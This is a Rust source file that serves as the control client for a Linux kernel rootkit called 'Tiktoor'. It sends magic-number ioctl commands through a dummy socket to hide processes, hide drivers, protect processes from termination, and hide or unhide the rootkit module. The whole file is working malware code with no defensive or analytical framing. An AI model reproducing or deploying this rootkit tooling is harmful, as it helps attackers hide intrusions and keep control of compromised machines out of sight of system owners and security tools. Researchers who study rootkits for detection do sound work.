use libc::{c_uchar, c_uint, c_ulong, c_void, AF_INET, SOCK_STREAM};
use std::ptr;

const TIKTOOR_IOCTL_CMD: c_ulong = 0xdeadbeaf;

#[repr(u8)]
enum Action {
    DriverHiding = 0x0,
    FileHiding = 0x1,
    PortHiding = 0x2,
    ProcessHiding = 0x3,
    ProcessProtection = 0x4,
    ModuleHiding = 0x5,
    ModuleUnhiding = 0x6,
}

#[repr(C)]
struct TiktoorCmdArg {
    action: c_uchar,
    subargs: *const c_void,
}

#[repr(C)]
struct ProcessHidingSubargs {
    pid: c_uint,
}

#[repr(C)]
struct ProcessProtectingSubargs {
    pid: c_uint,
}

/// Hide process given by its pid
pub fn hide_process(pid: u32) {
    let subargs = ProcessHidingSubargs { pid };
    let cmd_arg = TiktoorCmdArg {
        action: Action::ProcessHiding as c_uchar,
        subargs: &subargs as *const _ as *const c_void,
    };
    unsafe {
        let dummy_socket = libc::socket(AF_INET, SOCK_STREAM, 6);
        libc::ioctl(
            dummy_socket,
            TIKTOOR_IOCTL_CMD,
            &cmd_arg as *const _ as *const c_void,
        );
    }
}

#[repr(C)]
struct DriverHidingSubargs {
    rank: c_uint,
}

/// Hide driver given by its name
pub fn hide_driver(rank: u32) {
    let subargs = DriverHidingSubargs { rank };
    let cmd_arg = TiktoorCmdArg {
        action: Action::DriverHiding as c_uchar,
        subargs: &subargs as *const _ as *const c_void,
    };
    unsafe {
        let dummy_socket = libc::socket(AF_INET, SOCK_STREAM, 6);
        libc::ioctl(
            dummy_socket,
            TIKTOOR_IOCTL_CMD,
            &cmd_arg as *const _ as *const c_void,
        );
    }
}

/// Protect process given by its pid
pub fn protect_process(pid: u32) {
    let subargs = ProcessProtectingSubargs { pid };
    let cmd_arg = TiktoorCmdArg {
        action: Action::ProcessProtection as c_uchar,
        subargs: &subargs as *const _ as *const c_void,
    };
    unsafe {
        let dummy_socket = libc::socket(AF_INET, SOCK_STREAM, 6);
        libc::ioctl(
            dummy_socket,
            TIKTOOR_IOCTL_CMD,
            &cmd_arg as *const _ as *const c_void,
        );
    }
}

/// Hide the rootkit module
pub fn hide_module() {
    let cmd_arg = TiktoorCmdArg {
        action: Action::ModuleHiding as c_uchar,
        subargs: ptr::null(),
    };
    unsafe {
        let dummy_socket = libc::socket(AF_INET, SOCK_STREAM, 6);
        libc::ioctl(
            dummy_socket,
            TIKTOOR_IOCTL_CMD,
            &cmd_arg as *const _ as *const c_void,
        );
    }
}

/// Unhide the rootkit module
pub fn unhide_module() {
    let cmd_arg = TiktoorCmdArg {
        action: Action::ModuleUnhiding as c_uchar,
        subargs: ptr::null(),
    };
    unsafe {
        let dummy_socket = libc::socket(AF_INET, SOCK_STREAM, 6);
        libc::ioctl(
            dummy_socket,
            TIKTOOR_IOCTL_CMD,
            &cmd_arg as *const _ as *const c_void,
        );
    }
}
